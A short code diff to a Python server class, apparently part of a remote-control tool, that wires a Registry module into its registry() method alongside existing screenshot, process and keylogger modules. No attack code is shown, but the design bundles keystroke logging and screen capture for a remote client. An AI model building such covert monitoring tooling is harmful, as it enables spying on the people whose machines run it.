@@ -5,7 +5,7 @@ from src.screenshot import Screenshot
 from src.process import Process
 from src.application import Application
 from src.keystroke import KeyLogger
-
+from src.registry import Registry
 
 class Server:
     def __init__(self):
@@ -64,6 +64,8 @@ class Server:
         pass
 
     def registry(self):
+        doit = Registry(self.client)
+        doit.run()
         pass
 
     def screenshot(self):
